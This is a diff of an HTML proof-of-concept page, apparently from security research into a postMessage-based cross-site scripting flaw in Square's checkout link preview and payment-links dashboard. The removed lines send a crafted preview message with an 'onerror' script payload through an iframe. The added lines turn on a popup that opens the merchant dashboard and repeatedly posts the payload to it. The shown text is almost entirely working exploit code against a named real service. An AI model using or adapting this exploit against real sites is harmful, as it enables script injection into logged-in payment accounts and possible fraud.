@@ -5,8 +5,6 @@
 </head>
 <body>
 
-  <iframe src="https://checkout.square.site/merchant/MLKH7PPM5QD3X/preview" onload="this.contentWindow.postMessage({name:'LINK_PREVIEW',data:{type:'INITIALIZE',uuid:'x',data:{checkout_link:{id:'l',link_type:'ITEM_LINK',checkout_link_data:{name:'P',link_type:'ITEM_LINK',order_details:{line_items:[{item_id:'i',quantity:{quantity:1}}]}}},related_objects:[{type:'ITEM',id:'i',item_data:{name:'XSS',description_html:'',description:'<img src=x onerror=alert(document.domain)>',variations:[{type:'ITEM_VARIATION',id:'v',item_variation_data:{item_id:'i',name:'D',pricing_type:'FIXED_PRICING',price_money:{amount:100,currency:'USD'}}}]}}],settings:{checkout_title:'XSS'}}}},'*')"></iframe>
-  
   <script>
     const targetUrl = 'https://app.squareup.com/dashboard/payment-links/new';
 
@@ -86,13 +84,13 @@
         // wait a bit before starting message spam
         setTimeout(() => {
           sendPayloadMultipleTimes(win);
-        }, 2000);
+        }, 1000);
       } else {
         console.error('Popup blocked or window.open failed');
       }
     }
 
-    // tryWindowOpen();
+    tryWindowOpen();
   </script>
 </body>
 </html>
